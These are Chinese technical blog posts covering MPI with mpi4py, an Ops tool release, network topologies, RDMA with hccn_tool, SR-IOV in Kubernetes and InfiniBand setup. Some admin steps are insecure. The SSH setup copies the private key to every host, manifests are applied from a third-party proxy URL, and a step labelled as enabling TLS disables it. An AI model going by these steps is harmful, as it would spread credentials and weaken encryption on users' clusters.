操作时，需要指定一个 op 操作称之为归约。上图中的归约操作就是求和。\nallreduce 1 2 3 4 5 6 7 MPI_Allreduce( void* send_data, void* recv_data, int count, MPI_Datatype datatype, MPI_Op op, MPI_Comm communicator) 不同于 reduce，allreduce 不需要指定 root，所有进程都会收到归约后的结果。\n3. 安装 MPICH\\OpenMPI 安装 MPICH 就执行\n1 apt-get install mpich -y 安装 OpenMPI 就执行\n1 apt-get install openmpi-bin -y 会得到编译命令和运行命令，无论是安装 MPICH 还是 OpenMPI，都会得到类似的命令行工具。\n3.1 MPI 编译命令 mpicc 使用 C 编译器编译 MPI 程序，确保编译出的程序可以使用 MPI 通信库。\nmpic++、mpiCC、mpicxx 使用 C++ 编译器编译 MPI 程序。\nmpif77、mpif90、mpifort 使用不同 Fortran 编译器编译 MPI 程序。\n3.2 MPI 运行命令 mpirun 运行 MPI 程序，管理 MPI 进程的启动。\nmpiexec 与 mpirun 类似，但是更加符合 MPI 标准。\nmpiexec.xxx、mpirun.xxx 针对特定环境、使用特定工具的 MPI 程序管理器。\n4. MPI 程序示例 4.1 编写 MPI Python 程序 1 vim /data/mpi.py 保存如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from mpi4py import MPI import numpy as np import socket comm = MPI.COMM_WORLD rank = comm.Get_rank() size = comm.Get_size() # 获取当前进程所在主机的主机名 hostname = socket.gethostname() # 每个进程生成一个随机数并包装成 numpy 数组 local_data = np.random.random(1) # 包装成一个 numpy 数组 print(f\u0026#34;Process {rank} on host {hostname} has local data: {local_data[0]}\u0026#34;) # 使用 gather 收集所有进程的数据 all_data = comm.gather(local_data[0], root=0) # 创建用于 Allreduce 的缓冲区 global_data = np.zeros(1, dtype=\u0026#39;d\u0026#39;) # 初始化全局数据为零，类型为 double comm.Allreduce(local_data, global_data, op=MPI.SUM) # 只在 rank 0 上输出结果 if rank == 0: print(f\u0026#34;All process data: {all_data}\u0026#34;) print(f\u0026#34;The sum of all data is: {global_data[0]}\u0026#34;) 在一些集合通信的场景下，有时会针对某个进程进行一些特殊处理，就会使用 rank 来判断当前进程的编号符合条件时，执行操作。\n4.2 配置免密 配置 /etc/hosts 编辑 /etc/hosts 文件，添加主机名和 IP 地址的映射。\n1 2 3 x.x.x.x host-1 x.x.x.x host-2 x.x.x.x host-3 生成 SSH 秘钥 1 ssh-keygen -t rsa 配置主机之间的相互免密 1 2 3 scp /root/.ssh/id_rsa /root/.ssh/id_rsa.pub host-1:/root/.ssh/ scp /root/.ssh/id_rsa /root/.ssh/id_rsa.pub host-2:/root/.ssh/ scp /root/.ssh/id_rsa /root/.ssh/id_rsa.pub host-3:/root/.ssh/ 4.3 安装依赖 安装 MPI 全部主机应该安装相同的 MPI 实现和版本。\n1 opscli shell -i host-1,host-2,host-3 --content \u0026#34;apt-get install openmpi-bin libopenmpi-dev -y\u0026#34; 这里需要额外安装一个依赖包 libopenmpi-dev，用于编译安装 mpi4py。\n安装 mpi4py、numpy 依赖 1 opscli shell -i host-1,host-2,host-3 --content \u0026#34;pip install mpi4py numpy\u0026#34; 将 mpi.py 文件拷贝到每个主机 1 2 scp /data/mpi.py host-2:/data/ scp /data/mpi.py host-3:/data/ 4.4 创建 Hostfile 文件 1 2 3 4 5 cat \u0026gt; hostfile \u0026lt;\u0026lt;EOF host-1 slots=1 host-2 slots=1 host-3 slots=1 EOF 这里的 slots 表示每个主机能启动的最大进程数。一般情况下，slots 为 CPU 核心数。\n除了使用 hostfile 文件指定主机，还可以使用 -host 参数指定主机及 slots 值。\n1 2 -host host-1 -host host-2 -host host-3 -host host-1:1 -host host-2:1 host-1:1 表示 host-1 只能启动一个进程，冒号后面是最大进程数。\n4.5 运行 MPI 程序 多机多进程 1 2 3 4 5 6 7 mpirun --allow-run-as-root -np 3 -hostfile hostfile python3 /data/mpi.py Process 2 on host host-3 has local data: 0.8237177424830892 Process 0 on host host-1 has local data: 0.4049368708804896 Process 1 on host host-2 has local data: 0.055557219335660935 All process data: [np.float64(0.4049368708804896), np.float64(0.055557219335660935), np.float64(0.8237177424830892)] The sum of all data is: 1.2842118326992398 单机多进程 1 2 3 4 5 6 7 8 mpirun --allow-run-as-root -np 4 -host host-2:4 python3 /data/mpi.py Process 1 on host host-2 has local data: 0.57806331374296 Process 0 on host host-2 has local data: 0.10289882095170111 Process 2 on host host-2 has local data: 0.7618555892517183 Process 3 on host host-2 has local data: 0.810980561742528 All process data: [0.10289882095170111, 0.57806331374296, 0.7618555892517183, 0.810980561742528] The sum of all data is: 2.2537982856889074 mpi 会按照 host 顺序，依次给每个 host 分配 slots 数量的进程 让可用的 slots 数量远大于进程数，观察 MPI 对进程的分配策略。\n1 2 3 4 5 6 7 8 mpirun --allow-run-as-root -np 4 -host host-1:2 -host host-2:4 -host host-3:8 python3 /data/mpi.py Process 3 on host host-2 has local data: 0.2001460877733756 Process 0 on host host-1 has local data: 0.6559694967423054 Process 2 on host host-2 has local data: 0.43367558731572886 Process 1 on host host-1 has local data: 0.8121368124082778 All process data: [np.float64(0.6559694967423054), np.float64(0.8121368124082778), np.float64(0.43367558731572886), np.float64(0.2001460877733756)] The sum of all data is: 2.101927984239688 实验了很多次，结果都是 host-1 分配 2 个进程，host-2 分配 2 个进程，host-3 没有分配进程。这说明，MPI 是按照提供的主机顺序，依次充分给 host 分配进程。\n5. 参考 https://mpitutorial.com/tutorials/ https://www.chenshaowen.com/ops/ ","description":"","id":19,"section":"post","tags":["博文","MPI","AI","分布式","通信"],"title":"MPI 通信原语及 Python 编程使用","uri":"https://www.chenshaowen.com/blog/mpi-communication-primitives-and-python-programming.html"},{"content":" 基于生产的真实需要，最近对 https://github.com/shaowenchen/ops 又进行了几个重要的更新，同时发布了 v1.0.0 版本。这里主要介绍一下这个版本的主要特性。\n1. 多集群执行任务的支持 在实践中，建议:\n将当前集群的主机创建为 Host 可以创建多个 Cluster，拥有的 Cluster 对象即为纳管的集群 Task、Pipeline 对象会自动同步到集群下的全部 Cluster 集群中，无需人工触发。\n当下发一个流水线任务时，需要创建一个 PipelineRun 对象。PipelineRun 是可以跨集群的，而 TaskRun 不行。\nController 会根据 PipelineRun 中设置的 cluster 字段，将 PipelineRun 分发到指定的集群中，由集群内的 Controller 执行具体的任务，再将 PipelineRun 的状态更新到主集群内的 PipelineRun 对象中。\n2. 支持页面端的 Copilot 交互 在 Ops Server 添加必要的变量 1 2 3 4 5 6 7 8 9 10 - name: SERVER_TOKEN value: ops - name: COPILOT_ENDPOINT value: https://llmapi.xxx.com/v1 - name: COPILOT_KEY value: sk-xxx - name: COPILOT_OPSSERVER value: http://myops-server.ops-system.svc - name: COPILOT_OPSTOKEN value: ops 其中 COPILOT_ENDPOINT、COPILOT_KEY 配置与 OpenAI API 兼容的推理接口; COPILOT_OPSSERVER、COPILOT_OPSTOKEN 是 Ops Server 的地址和 Token。\n使用 Copilot 直接输入文本，发送相关消息即可。\n3. 支持 ARM 环境 所有的核心组件，都已经支持 ARM64 架构，已经在生产的 ARM 环境中验证，包括:\nOpsCli OpsController OpsServer 在适配 ARM 环境的过程中，我也同步、制作了很多的多架构镜像到 Aliyun 的 ACR 仓库中。\n4. 运维总线 建议在每个集群中安装一个 Nats 组件，通过边缘集群的模式，可以将全部的事件汇总到一个集群，或者若干个网络分区的集群。\n在事件中，主要定义了以下 Topic:\n探活类，每个主机、集群会有定时检测，能够看到探活的事件 执行任务类，执行 TaskRun、PipelineRun 任务的事件 巡检类，TaskRun 执行定时任务巡检任务时，会推送相关的检测事件 Webhook类，用户自定义的一些运维事件，告警、通知等 通过运维总线，可以非常方便地进行系统集成。\n5. 未来规划 继续将 Ops Copilot 往 Ops Agent 方向演进 UI 增强，支持更多的交互 ","description":"","id":20,"section":"post","tags":["博文","Ops","运维"],"title":"Ops 发布 v1.0.0 版本","uri":"https://www.chenshaowen.com/blog/ops-v1.0.0.html"},{"content":"1. Fat-Tree 1985 年 麻省理工学院的 Charles E. Leiserson 发明了 Fat-Tree 胖树网络。如下图，胖树网络是一颗二叉树，从更节点到叶子节点带宽逐步增加。\n2008 年 8 月，加州大学圣地亚哥分校的一组计算机科学家发表了一个可扩展的网络架构设计，该设计采用受胖树拓扑启发的拓扑结构，实现了比以前的分层网络扩展性更好的网络。\nFat-Tree 网络的优势:\n负载均衡 低延迟 Fat-Tree 网络的劣势:\n规模受到核心交换机端口数量限制 底层容错性能差 不能很好适应 one-to-all、all-to-all 的通信模式 2. Spine-Leaf Spine-Leaf（脊叶）网络是一种常见的数据中心网络架构。不同于传统的分层网络结构，Spine-Leaf 网络在两个级别上实现了均衡的拓扑结构：Spine 层和 Leaf 层。Leaf 层的交换机连接服务器，而 Spine 层的交换机则负责连接 Leaf 层的交换机。每个 Leaf 交换机连接到每个 Spine 交换机，从而提供了高带宽和低延迟的通信路径。\nSpine-Leaf 网络的优势：\n横向扩展性好：可以通过增加 Spine 和 Leaf 层的交换机数量来增加网络容量 高可靠性：支持多路径，可以有效避免单点故障 低延迟：采用等距的多路径连接，数据传输路径简洁稳定 Spine-Leaf 网络的劣势：\n成本较高：每个 Leaf 交换机需要连接到所有 Spine 交换机，导致连接数量大 配置复杂：需要精心规划交换机之间的连接，以保持网络对称性 适应性有限：在特定应用场景下可能需要对 Leaf 层的连接方式进行调整 3. Dragonfly Dragonfly 网络是由 John Kim 等人于 2008 年提出的一种高效的网络拓扑结构，最早应用于高性能计算（HPC）集群。该结构主要解决了传统胖树网络架构中带宽和成本的矛盾，特别适合大规模并行计算和数据密集型任务。Dragonfly 网络通过分层级的交换机和链路，将网络划分为多个群组（group），每个群组包含多个路由器或交换机，并且群组之间通过相对少的跨群组链路互联。\nDragonfly 网络的优势：\n高带宽利用率：通过本地和全局连接实现有效的数据传输 网络直径小：较短的跳数提升了数据传输速度，减少了延迟 成本低：通过有效的连接方式降低了整体布线和硬件成本 Dragonfly 网络的劣势：\n路由复杂性高：全局连接需要较为复杂的路由算法 容错性一般：故障可能会影响较大范围的连接 不适合小规模网络：在小规模部署中，Dragonfly 的结构可能导致资源浪费 4. Torus Torus（环形网络）是一种在高性能计算（HPC）和分布式系统中常见的拓扑结构，最早由计算机科学家在 20 世纪 80 年代提出并应用于并行计算架构。\nTorus 网络是一种多维的网格结构，边界节点通过额外的连接形成闭环，使得每个节点的连接更加对称。\nTorus 网络的优势\n良好的负载均衡：各节点连接均衡，能有效分散通信负载 低网络延迟：由于闭环连接，每个节点到其他节点的距离较短，通信延迟低 高容错性：多路径连接使得网络能在单点故障下维持通信 Torus 网络的劣势\n扩展性有限：在高维情况下，网格边界和节点数量会大幅增长，硬件复杂度增加 布线复杂：特别是在三维及更高维度时，布线和节点连接变得困难 不适合广播通信：对于 one-to-all 和 all-to-all 通信模式，Torus 的拓扑结构表现较差，广播效率低 ","description":"","id":21,"section":"post","tags":["博文","AI","网络","拓扑结构"],"title":"常见的几种网络拓扑结构","uri":"https://www.chenshaowen.com/blog/common-network-topology.html"},{"content":"1. 什么是 RDMA RDMA(Remote Direct Memory Access，远程直接内存访问)是一种为了解决网络传输中服务器端数据处理延迟而产生的技术。\nTCP/IP 传输时，数据经过网络堆栈，再经过网卡发送，接收端接收后，按照序列号组装数据。\nDMA 传输时，可以直接在设备和内存之间传输数据，不需要经过网络堆栈。\nRDMA 传输时，可以实现跨节点的 DMA 数据传输。\n三者之间的对比如下:\n特性 TCP DMA RDMA CPU 占用 较高（通常 10-40% 以上） 较低（\u0026lt;10%，依赖于实现） 极低（通常在 1% 以下） 延迟 10-100 微秒 数微秒（内存传输） 亚微秒到单微秒级 带宽效率 1-10 Gbps（视网络条件而定） 最高可达 100 Gbps（与总线速率相关） 100-400 Gbps（依赖于 RDMA 网卡型号，如 RoCE、InfiniBand） 适用场景 通用网络传输 本地内存或设备间数据传输 高性能网络传输 硬件要求 无 需要 DMA 控制器 需要 RDMA 网卡（如 InfiniBand 或 RoCE） 2. RDMA 通信过程 RDMA 使用队列的机制进行数据通信，其基本通信单位是 QP（Queue Pairs，队列对）。一个 QP 由一个 SQ（Send Queue，发送队列）和一个 RQ（Receive Queue，接收队列）构成。\n大致的通信过程如下\nHOST 提交工作请求 WR（Work Request，工作请求），将 WR 放到工作队列 WQ(Work Queue，工作队列) RDMA 硬件消费 WQE 中的 WR，进行数据传输 RDMA 硬件消费完成后，产生 CQE（Completion Queue Entry，完成队列条目），将 CQE 放入 CQ （Completion Queue，完成队列）队列中，等待 HOST 消费 HOST 从 CQ 中消费 WC （Work Completion，工作完成） 3. RDMA 技术实现 3.1 InfiniBand 由 InfiniBand Trade Association（IBTA）在 1999 年提出，旨在为高性能计算（HPC）和大规模数据中心提供高带宽、低延迟的连接，主要由英特尔、NVIDIA、Mellanox（现为英伟达子公司）、IBM 等推动，广泛应用于超级计算机和企业级存储解决方案。\nInfiniBand 已成为数据中心和 HPC 的标准之一，支持多种协议（如 RDMA 和 NVMe over Fabrics），并逐渐向 AI 和机器学习领域扩展。\nInfiniBand 具有高带宽（可达 400Gbps）、低延迟（微秒级）、支持大规模扩展、具备先进的流量管理和质量服务（QoS）特性。\n3.2. iWARP 由 IETF 的 RDMA Working Group 在 2000 年提出，旨在通过现有的 TCP/IP 网络实现 RDMA，主要由英特尔、Cisco、Broadcom 等公司推动，尤其在云计算和虚拟化环境中应用广泛。\niWARP 在企业网络中得到一定应用，尤其是在传统以太网架构下的 RDMA 需求，逐渐被市场认可，但竞争力相对较弱。\niWARP 兼容性强（可在现有以太网基础设施上运行）、支持 TCP/IP 协议，降低了 RDMA 的部署门槛，适用于中小型数据中心。\n3.3. RoCE (RDMA over Converged Ethernet) 由 IBM 和其他公司在 2008 年提出，旨在将 RDMA 整合到以太网环境中，通过 DCB 技术实现高效的数据传输，主要由 Mellanox（现为英伟达）、Cisco、Intel 等公司推动，逐渐在数据中心和云计算环境中普及。\nRoCE 有两个版本 RoCE v1 协议是一个以太网链路层协议，RoCEv2 协议构筑于 UDP/IPv4 或 UDP/IPv6 协议之上，能组建更大的网络。\n相较于 InfiniBand，RoCE 的优势在于可以在现有以太网基础设施上运行，能够降低部分的硬件成本，但也很难达到 InfiniBand 成本的 50% 一下。\n4. Ascend 下的 RDMA Atlas 800 的 RDMA 依赖于 RoCE 网卡，如下图:\n一个 Board 上四个 SF216D-H 网卡，每个 SF216D-H 有两个 200GE 网卡。每个网卡连接一张 NPU 卡，用于组网。\n华为 Altas 800 集群组网时，通过一个外部交换机将各个 NPU 卡连接起来，组成一个参数面的网络。由于每个交换机的网卡是有限的，如果需要更大的网络就需要借助 Spine-Leaf 网络拓扑。\n4.1 常用配置命令 设置 IP 地址和掩码 1 hccn_tool -i 0 -ip -s address 10.52.11.2 netmask 255.255.255.0 -i 指定卡的编号。\n设置 Roce 网卡默认网关 1 hccn_tool -i 0 -gateway -s gateway 10.52.11.1 设置网络检测对象 1 hccn_tool -i 0 -netdetect -s address 10.52.11.1 这个 IP 主要用来设置检测网络状态，一般设置为网段内的网关地址。\n使能 TLS 1 for i in {0..7}; do hccn_tool -i $i -tls -s enable 0; done 4.2 常用检测命令 查看组网 IP 1 cat /etc/hccn.conf 或者\n1 for i in {0..15}; do hccn_tool -i $i -ip -g; done 检查单节点内网卡 IP 的连通性 1 for i in {0..7};do hccn_tool -i $i -net_health -g;done 4.3 常用组网命令 查看光模块状态 1 for i in {0..7};do hccn_tool -i ${i} -optical -g;done 查看通信端口连接状态 1 for i in {0..7};do hccn_tool -i ${i} -link -g;done 查询 tls 状态 1 for i in {0..7};do hccn_tool -i ${i} -tls -g;done 4.4 测试跨机带宽 获取接收端卡的 IP 1 2 3 4 hccn_tool -i 0 -ip -g ipaddr:10.52.11.3 netmask:255.255.255.0 接收端 1 2 hccn_tool -i 0 -roce_test reset hccn_tool -i 0 -roce_test ib_send_bw -s 4096000 -n 1000 -tcp 发送端 1 2 hccn_tool -i 1 -roce_test reset hccn_tool -i 1 -roce_test ib_send_bw -s 4096000 -n 1000 address 10.52.11.3 -tcp ","description":"","id":22,"section":"post","tags":["博文","RDMA","AI"],"title":"RDMA 技术","uri":"https://www.chenshaowen.com/blog/rdma-technique.html"},{"content":"1. 什么是 SR-IOV 技术 SR-IOV（Single Root I/O Virtualization）是一种虚拟化技术，它允许虚拟机、容器直接访问物理硬件资源，从而提高 I/O 性能，还能减少主机 CPU 消耗。\n如上图，SR-IOV 将单个物理设备（例如网络接口卡，NIC）划分成多个虚拟功能 (Virtual Functions, VFs)，每个 VF 可以被分配给不同的虚拟机或容器，像独立的设备一样使用。\n2. 开启 SR-IOV 软件硬件支持 在开机时按下 Del 或 F2 等键进入 BIOS 设置界面，相关的配置通常在 Advanced \\ System Configuration \\ Virtualization 中。\n开启 VT-d VT-d 是定向 I/O 虚拟化技术，俗称虚拟化直通技术。允许宿主机将某些硬件资源（比如硬盘、显卡、网卡）的管辖权直接移交给虚拟机。\n开启 SR-IOV SR-IOV（Single Root I/O Virtualization）是一种 PCIe 设备虚拟化技术，它允许将单个物理 PCIe 设备（如网卡）划分为多个虚拟功能（VF）。\n开启 IOMMU 开启 IOMMU 后，系统能够为每个虚拟机分配独立的设备地址空间，提供设备的内存隔离和保护，防止虚拟机之间发生内存地址冲突。\n系统设置 编辑 Grub 配置\n1 vim /etc/default/grub 在 GRUB_CMDLINE_LINUX 中添加 intel_iommu=on iommu=pt。\n生成 Grub 配置\n1 grub-mkconfig -o /boot/grub/grub.cfg 重启系统\n1 reboot 查看是否开启 IOMMU\n1 dmesg | grep -e DMAR -e IOMMU 3. 查看本地网络设备 查看 SR-IOV 设备 1 2 3 4 5 6 7 lspci -v | grep -i SR-IOV Capabilities: [bcc] Single Root I/O Virtualization (SR-IOV) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) Capabilities: [160] Single Root I/O Virtualization (SR-IOV) 这其中 1 个 [bcc] 是 NVIDIA 显卡的 SR-IOV 设备，剩下的 4 个 [160] 是 Intel 网卡。\n3.1 查看网卡 列出网卡 1 2 3 ls /sys/class/net/ eth0 eth1 bond1 lo calixxx ... 其中，ethX 是真实的物理网卡，bondX 是网络绑定 (bonding) 接口，lo 是本机的 loopback 网络接口，calixxx 是网络插件 Calico 为容器提供的网络接口.\n网络绑定是一种将多个物理网络接口组合为一个逻辑接口的方法。\n查看 bond 绑定的网卡 1 2 3 4 5 6 7 8 9 10 11 12 13 14 cat /proc/net/bonding/bond1 Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011) ... Slave Interface: eth5 MII Status: up Speed: 10000 Mbps ... Slave Interface: eth4 MII Status: up Speed: 10000 Mbps ... 这意味着，bond1 绑定了两个 eth5 和 eth4 网卡，聚合成一个虚拟网卡提供 20 Gbps 的带宽。\n3.2 创建 SR-IOV VF SR-IOV 针对的是物理网卡，不能针对 bond 绑定的网卡，而要使用 ethX 网卡。\n查看之前是否已经开启 SR-IOV 1 2 3 cat /sys/class/net/eth0/device/sriov_numvfs 0 开启 SR-IOV 1 echo 2 \u0026gt; /sys/class/net/eth0/device/sriov_numvfs 查看 VF 1 2 3 4 lspci | grep Virtual 3d:02.0 Ethernet controller: Intel Corporation Ethernet Virtual Function 700 Series (rev 09) 3d:02.1 Ethernet controller: Intel Corporation Ethernet Virtual Function 700 Series (rev 09) 这样就给网卡创建了 2 个 SR-IOV VF。\n查看网卡 1 2 3 4 5 6 7 ip link show eth0 4: eth0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 90:f7:b2:4b:dc:3d brd ff:ff:ff:ff:ff:ff vf 0 link/ether 2e:3a:41:bc:02:cc brd ff:ff:ff:ff:ff:ff, spoof checking on, link-state auto, trust off vf 1 link/ether 5a:d4:e4:45:83:7b brd ff:ff:ff:ff:ff:ff, spoof checking on, link-state auto, trust off altname enp61s0f0 3.3 删除 SR-IOV VF 1 echo 0 \u0026gt; /sys/class/net/eth0/device/sriov_numvfs 4 K8s 下使用 SR-IOV 4.1 Pod 中如何使用 SR-IOV SR-IOV 设备的 VF 资源在 Pod 中是无法被直接访问的，需要基于 Kubernetes 的资源扩展方式实现对 VF 的管理。\n如果需要卸载，请同时删除节点下的 /etc/cni/net.d/*multus* 文件，否则会导致 Pod 无法创建。\n4.2 创建 multus 安装 kube-multus 之后，一个 Pod 可以使用多个网卡。\n1 kubectl apply -f https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/refs/heads/main/network/kube-multus.yml 4.3 安装 SR-IOV CNI 安装 kube-sriov-cni 之后，创建 Pod 网络时，可以调用 SR-IOV CNI 挂载 VF 资源。\n1 kubectl apply -f https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/main/network/kube-sriov-cni.yaml 4.4 安装 SR-IOV 设备插件 安装 sriov-network-device-plugin 之后，创建 Pod 时，Kublet 会通过 GRPC 与 sriov-network-device-plugin 交互来给 Pod 分配 SR-IOV VF。\n1 kubectl apply -f https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/refs/heads/main/network/kube-sriov-device-plugin.yaml 4.5 配置可用的 SR-IOV VF 查看网卡 1 2 3 4 5 6 7 8 9 10 11 12 ethtool -i eth0 driver: i40e # 驱动 version: 2.25.7 firmware-version: 4.10 0x80001a63 1.2585.0 expansion-rom-version: bus-info: 0000:3d:00.0 # PCI 地址 supports-statistics: yes supports-test: yes supports-eeprom-access: yes supports-register-dump: yes supports-priv-flags: yes 确认支持 SR-IOV 1 2 3 lspci -s 0000:3d:00.0 -v | grep SR-IOV Capabilities: [160] Single Root I/O Virtualization (SR-IOV) 查看厂商、设备 ID 1 2 3 lspci -s 0000:3d:00.0 -n 3d:00.0 0200: 8086:37d1 (rev 09) 这里的 8086 就是厂商 ID，37d1 就是设备 ID。\n1 kubectl -n kube-system edit cm sriovdp-config 1 2 3 4 5 6 7 8 { \u0026#34;resourceName\u0026#34;: \u0026#34;eth0\u0026#34;, \u0026#34;selectors\u0026#34;: { \u0026#34;drivers\u0026#34;: [\u0026#34;i40e\u0026#34;], \u0026#34;vendor\u0026#34;: [\u0026#34;8086\u0026#34;], \u0026#34;device\u0026#34;: [\u0026#34;37d1\u0026#34;] } }, 查看发现的 SR-IOV 设备 1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl get node bj6-a-kas-t41-01 -o json | jq \u0026#39;.status.allocatable\u0026#39; { \u0026#34;cpu\u0026#34;: \u0026#34;38\u0026#34;, \u0026#34;ephemeral-storage\u0026#34;: \u0026#34;527342541975\u0026#34;, \u0026#34;hugepages-1Gi\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;hugepages-2Mi\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;intel.com/eth0\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;memory\u0026#34;: \u0026#34;127356472Ki\u0026#34;, \u0026#34;pods\u0026#34;: \u0026#34;110\u0026#34;, \u0026#34;tencent.com/vcuda-core\u0026#34;: \u0026#34;100\u0026#34;, \u0026#34;tencent.com/vcuda-memory\u0026#34;: \u0026#34;60\u0026#34; } 这里的 intel.com/eth0 就是 sirov-device-plugin 识别的 SR-IOV 设备。\n4.6 配置 NetworkAttachmentDefinition 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: k8s.cni.cncf.io/v1 kind: NetworkAttachmentDefinition metadata: annotations: k8s.v1.cni.cncf.io/resourceName: intel.com/eth0 name: sriov-eth0 namespace: default spec: config: | { \u0026#34;type\u0026#34;: \u0026#34;sriov\u0026#34;, \u0026#34;cniVersion\u0026#34;: \u0026#34;0.3.1\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;sriov-network\u0026#34;, \u0026#34;ipam\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;host-local\u0026#34; } } EOF 如果 Pod 一直处于 ContainerCreating 状态，很有可能是 NetworkAttachmentDefinition 配置错误。\n4.7 创建普通 Pod 1 2 3 4 5 6 7 8 9 10 11 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: demo-ubuntu spec: containers: - name: demo-ubuntu image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-ubuntu imagePullPolicy: Always EOF 查看网卡\n1 2 3 4 5 6 kubectl exec -it demo-ubuntu ip link show 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 3: eth0@if1659: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default link/ether 52:22:5d:0c:0d:d3 brd ff:ff:ff:ff:ff:ff link-netnsid 0 4.8 创建 SR-IOV Pod 通过注解的方式，可以给 Pod 申请 SR-IOV VF。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: demo-ubuntu-sriov annotations: k8s.v1.cni.cncf.io/networks: sriov-eth0 spec: containers: - name: demo-ubuntu image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-ubuntu imagePullPolicy: Always resources: requests: intel.com/eth0: \u0026#39;1\u0026#39; limits: intel.com/eth0: \u0026#39;1\u0026#39; EOF 查看网卡\n1 2 3 4 5 6 7 8 9 10 kubectl exec -it demo-ubuntu-sriov ip link show 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 3: eth0@if1663: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1450 qdisc noqueue state UP mode DEFAULT group default link/ether f2:32:06:2f:85:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0 7: net1: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc mq state DOWN mode DEFAULT group default qlen 1000 link/ether 90:f7:b2:4b:dc:40 brd ff:ff:ff:ff:ff:ff alias eth0 altname enp61s0f0 主机上的 eth0 也是 DOWN 状态，这里出现了 net1 网卡就说明已经配置了 SR-IOV VF。\n4.9 将 sriov 设置为默认网卡 需要在 kube-system 下创建 NetworkAttachmentDefinition 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: demo-ubuntu-sriov-default annotations: v1.multus-cni.io/default-network: sriov-eth0 spec: containers: - name: demo-ubuntu image: registry.cn-beijing.aliyuncs.com/shaowenchen/demo-ubuntu imagePullPolicy: Always resources: requests: intel.com/eth0: \u0026#39;1\u0026#39; limits: intel.com/eth0: \u0026#39;1\u0026#39; EOF 5. 总结 本篇文章，介绍了 SR-IOV 技术以及在 Kubernetes 中的使用。\n常用的部署方式还有 https://github.com/k8snetworkplumbingwg/sriov-network-operator ，借助 Operator 可以更快地实现 SR-IOV 与 Kubernetes 的集成。\nSR-IOV 实现了对物理网卡的虚拟化、多租户使用。除了借助 sriov-network-device-plugin 实现对 VF 资源的注册，还有一种方式是 k8s-rdma-shared-dev-plugin，在我们生产的环境中，也是使用的这种方式对接 IB 网卡。\n","description":"","id":23,"section":"post","tags":["博文","虚拟化","SR-IOV"],"title":"SR-IOV 技术","uri":"https://www.chenshaowen.com/blog/sr-iov-technique.html"},{"content":"1. InfiniBand 网络 InfiniBand(缩写 IB)，是一个用于高性能计算的计算机网络通信标准，它具有极高的吞吐量和极低的延迟，用于计算机与计算机之间的数据互连。InfiniBand 也用作服务器与存储系统之间的直接或交换互连，以及存储系统之间的互连。\nInfiniBand 网络需要专属的软硬件环境，包括 InfiniBand 网卡、光纤连接和支持 InfiniBand 的交换机，以提供高速无损的互联网络。InfiniBand 协议通过高效的数据传输能力，尤其是远程直接内存访问（RDMA），使得在多节点环境中实现极优的数据传输速率，通常能达到 200 Gbps 以上。\n2. InfiniBand 组网 InfiniBand 的网络分为两层:\n第一层是由 End Node 和 Switch 组成的 Subnet，End Node 一般是插在结点上的 IB 卡上 第二层是由 Router 连接起来的若干个 Subnet Subnet Manager 给每个 Node 和 Switch 分配 Local ID，同一个 Subnet 中通过 LID（Local ID）来路由。\n3. 安装 MLNX OFED 驱动 MLNX OFED 用来启用和优化 Mellanox 网卡的网络传输性能。\n下载 1 wget https://content.mellanox.com/ofed/MLNX_OFED-4.9-5.1.0.0/MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64.tgz 安装 1 2 3 tar zxf MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64.tgz cd MLNX_OFED_LINUX-4.9-5.1.0.0-ubuntu20.04-x86_64 ./mlnxofedinstall 查看状态 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 systemctl status openibd ● openibd.service - openibd - configure Mellanox devices Loaded: loaded (/lib/systemd/system/openibd.service; enabled; vendor preset: enabled) Active: active (exited) since Mon 2024-11-04 11:36:29 CST; 2min 35s ago Docs: file:/etc/infiniband/openib.conf Process: 45926 ExecStart=/etc/init.d/openibd start bootid=0bc1ef52562f40ba85221c254bfc466e (code=exited, status=0/S\u0026gt; Main PID: 45926 (code=exited, status=0/SUCCESS) Tasks: 0 (limit: 9830) Memory: 13.8M CGroup: /system.slice/openibd.service Nov 04 11:36:24 bj6-e-ai-kas-node-a800-gc-01 systemd[1]: Starting 